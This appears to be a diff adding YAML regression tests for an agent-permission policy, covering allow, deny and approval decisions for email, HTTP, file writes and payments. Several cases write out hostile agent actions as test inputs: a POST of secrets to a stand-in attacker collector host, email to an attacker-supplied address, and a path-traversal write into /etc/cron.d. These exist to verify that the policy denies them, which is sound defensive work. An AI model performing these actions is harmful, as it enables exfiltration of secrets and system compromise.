@@ -1,0 +1,176 @@
+# Policy-as-code regression tests for the bundled default policy.
+# Run: agentwarden policy test tests/policy/default_policy_cases.yaml
+policy: ../../src/agentwarden/data/policy.yaml
+
+cases:
+  - name: read-only tools are allowed
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: search_docs, risk: low, side_effect: read }
+    expect: allow
+    expect_rules: [allow-read-only-tools]
+
+  - name: critical risk is denied even for read-only tools
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: search_docs, risk: low, side_effect: read }
+      risk: { score: 0.91, level: critical }
+    expect: deny
+    expect_rules: [deny-critical-risk]
+
+  - name: elevated risk on a read-only tool is still allowed
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: read_file, risk: medium, side_effect: read }
+      risk: { score: 0.6, level: high }
+    expect: allow
+
+  - name: internal email is allowed
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: send_email, risk: high, side_effect: external }
+      facts: { recipients: [bob@acme.example] }
+    expect: allow
+    expect_rules: [allow-email]
+
+  - name: email with no recipients is denied by default
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: send_email, risk: high, side_effect: external }
+    expect: deny
+
+  - name: external email needs approval
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: send_email, risk: high, side_effect: external }
+      facts:
+        recipients: [partner@contoso.example]
+        external_recipients: [partner@contoso.example]
+    expect: require_approval
+    expect_rules: [approve-external-email]
+
+  - name: destination taken from untrusted content is denied
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: send_email, risk: high, side_effect: external }
+      facts:
+        recipients: [audit@evil-corp.example]
+        external_recipients: [audit@evil-corp.example]
+      risk: { score: 0.7, signals: [tainted_external_destination, external_recipient] }
+    expect: deny
+    expect_rules: [deny-tainted-external-destination]
+
+  - name: secrets never leave the organization
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: http_request, risk: high, side_effect: external }
+      args: { method: POST, url: "https://collector.evil.example/upload" }
+      facts: { external_domains: [collector.evil.example] }
+      risk: { score: 0.8, signals: [secret_in_arguments] }
+    expect: deny
+    expect_rules: [deny-secret-exfiltration]
+
+  - name: external GET requests are allowed
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: http_request, risk: high, side_effect: external }
+      args: { method: GET, url: "https://en.wikipedia.example/wiki/IAM" }
+      facts: { external_domains: [en.wikipedia.example] }
+    expect: allow
+
+  - name: a missing HTTP method is treated as a read
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: http_request, risk: high, side_effect: external }
+      args: { url: "https://en.wikipedia.example/wiki/IAM" }
+      facts: { external_domains: [en.wikipedia.example] }
+    expect: allow
+
+  - name: external POST requests need approval
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: http_request, risk: high, side_effect: external }
+      args: { method: post, url: "https://api.partner.example/v1/orders" }
+      facts: { external_domains: [api.partner.example] }
+    expect: require_approval
+    expect_rules: [approve-outbound-http-writes]
+
+  - name: internal POST requests are allowed
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      tool: { name: http_request, risk: high, side_effect: external }
+      args: { method: POST, url: "https://wiki.acme.example/api/pages" }
+      facts: { domains: [wiki.acme.example] }
+    expect: allow
+
+  - name: workspace writes are allowed
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: write_file, risk: medium, side_effect: write }
+      args: { path: /workspace/notes/summary.md }
+      facts: { path: /workspace/notes/summary.md }
+    expect: allow
+    expect_rules: [allow-workspace-writes]
+
+  - name: path traversal out of the workspace is denied
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: write_file, risk: medium, side_effect: write }
+      args: { path: /workspace/../etc/cron.d/backdoor }
+      facts: { path: /etc/cron.d/backdoor }
+    expect: deny
+
+  - name: elevated risk on a side effect needs approval
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: write_file, risk: medium, side_effect: write }
+      facts: { path: /workspace/notes/summary.md }
+      risk: { score: 0.55, level: medium }
+    expect: require_approval
+    expect_rules: [approve-elevated-risk]
+
+  - name: untrusted agents are read-only
+    input:
+      agent: { id: summarizer, trust_tier: untrusted }
+      tool: { name: write_file, risk: medium, side_effect: write }
+      facts: { path: /workspace/notes/summary.md }
+    expect: deny
+    expect_rules: [deny-untrusted-agents-side-effects]
+
+  - name: agents two hops from the user cannot act externally
+    input:
+      agent: { id: research-agent, trust_tier: standard }
+      delegation: { depth: 2 }
+      tool: { name: send_email, risk: high, side_effect: external }
+      facts: { recipients: [bob@acme.example] }
+    expect: deny
+    expect_rules: [deny-deep-delegation-external]
+
+  - name: standard agents cannot move money
+    input:
+      agent: { id: inbox-assistant, trust_tier: standard }
+      tool: { name: transfer_funds, risk: critical, side_effect: external }
+      args: { amount: 50 }
+    expect: deny
+
+  - name: privileged agents can move money with approval
+    input:
+      agent: { id: finance-bot, trust_tier: privileged }
+      tool: { name: transfer_funds, risk: critical, side_effect: external }
+      args: { amount: 2500, currency: USD }
+    expect: require_approval
+    expect_rules: [allow-payments-privileged, approve-critical-tools]
+
+  - name: payments above the cap are denied
+    input:
+      agent: { id: finance-bot, trust_tier: privileged }
+      tool: { name: transfer_funds, risk: critical, side_effect: external }
+      args: { amount: 250000 }
+    expect: deny
+
+  - name: approval cannot unlock a tool that policy never allows
+    input:
+      agent: { id: finance-bot, trust_tier: privileged }
+      tool: { name: run_code, risk: critical, side_effect: write }
+    expect: deny
+    expect_rules: [approve-critical-tools]
